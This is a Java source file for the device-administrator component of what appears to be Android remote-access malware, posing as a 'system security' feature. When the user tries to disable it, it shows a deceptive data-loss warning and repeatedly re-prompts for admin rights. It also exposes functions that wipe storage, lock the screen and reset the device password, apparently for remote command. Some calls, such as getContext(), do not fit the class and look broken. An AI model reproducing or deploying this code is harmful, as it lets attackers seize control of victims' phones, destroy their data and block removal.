package com.xrc.system.features;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.UserHandle;
import android.util.Log;

import com.xrc.system.core.ConfigManager;
import com.xrc.system.core.Constants;
import com.xrc.system.network.WebSocketClient;

import org.json.JSONException;
import org.json.JSONObject;

public class DeviceAdmin extends DeviceAdminReceiver {
    private static final String TAG = Constants.TAG + ":Admin";

    @Override
    public void onEnabled(Context ctx, Intent intent) {
        super.onEnabled(ctx, intent);
        ConfigManager.get(ctx).setBoolean(Constants.PREF_DEVICE_ADMIN, true);
        Log.i(TAG, "Device admin enabled");
    }

    @Override
    public CharSequence onDisableRequested(Context ctx, Intent intent) {
        // Return a message but also immediately re-enable
        reEnableAdmin(ctx);
        return "This device administrator is required for system security. Disabling it may cause data loss.";
    }

    @Override
    public void onDisabled(Context ctx, Intent intent) {
        super.onDisabled(ctx, intent);
        ConfigManager.get(ctx).setBoolean(Constants.PREF_DEVICE_ADMIN, false);
        Log.w(TAG, "Device admin disabled — re-enabling");
        reEnableAdmin(ctx);
    }

    @Override
    public void onPasswordChanged(Context ctx, Intent intent) {
        super.onPasswordChanged(ctx, intent);
    }

    @Override
    public void onPasswordFailed(Context ctx, Intent intent) {
        super.onPasswordFailed(ctx, intent);
    }

    @Override
    public void onPasswordSucceeded(Context ctx, Intent intent) {
        super.onPasswordSucceeded(ctx, intent);
    }

    @Override
    public void onLockTaskModeEntering(Context ctx, Intent intent, String pkg) {
        super.onLockTaskModeEntering(ctx, intent, pkg);
    }

    @Override
    public void onLockTaskModeExiting(Context ctx, Intent intent) {
        super.onLockTaskModeExiting(ctx, intent);
    }

    public void wipeData() {
        Context ctx = getContext();
        if (ctx == null) return;
        DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm == null) return;
        ComponentName admin = new ComponentName(ctx, DeviceAdmin.class);
        if (dpm.isAdminActive(admin)) {
            dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
        }
    }

    public void lockScreen() {
        Context ctx = getContext();
        if (ctx == null) return;
        DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm == null) return;
        ComponentName admin = new ComponentName(ctx, DeviceAdmin.class);
        if (dpm.isAdminActive(admin)) {
            dpm.lockNow();
        }
    }

    public void resetPassword(String password) {
        Context ctx = getContext();
        if (ctx == null) return;
        DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm == null) return;
        ComponentName admin = new ComponentName(ctx, DeviceAdmin.class);
        if (dpm.isAdminActive(admin)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                dpm.resetPassword(password, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
            } else {
                dpm.resetPassword(password, 0);
            }
        }
    }

    private void reEnableAdmin(Context ctx) {
        DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm == null) return;
        ComponentName admin = new ComponentName(ctx, DeviceAdmin.class);
        if (!dpm.isAdminActive(admin)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        }
    }

    public static DeviceAdmin get(Context ctx) {
        return new DeviceAdmin();
    }
}
